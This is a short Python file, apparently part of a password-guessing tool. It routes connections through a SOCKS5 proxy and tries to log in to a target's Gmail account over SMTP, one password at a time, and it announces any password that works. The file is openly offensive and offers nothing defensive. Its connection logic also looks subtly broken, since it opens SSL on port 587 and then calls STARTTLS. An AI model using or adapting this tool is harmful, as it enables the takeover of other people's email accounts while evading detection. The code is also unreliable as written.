import smtplib
import socks


def try_password(target, password, ip, port, GLOB_HIDE) -> None:
    print("FUNC try_password STARTED")
    try:
        socks.setdefaultproxy(socks.SOCKS5, ip, port)
        socks.wrapmodule(smtplib)
    except Exception as e:
        print(f"(try_password:socks): {e}")

    try:
        server = smtplib.SMTP_SSL('smtp.gmail.com', 587)
        print("Starting TLS...")
        server.starttls()
        server.login(target, password)
        print(f"=========== {password} ============")
    except smtplib.SMTPAuthenticationError:
        if GLOB_HIDE == False:
            print(f"(try_password:auth) Password [{password}] wrong, trying next one.")
        else:
            print(f"(try_password:auth) Password [GLOB_HIDE=True] wrong, trying next one.")
    except Exception as e:
        print(f"(try_password): {e}")
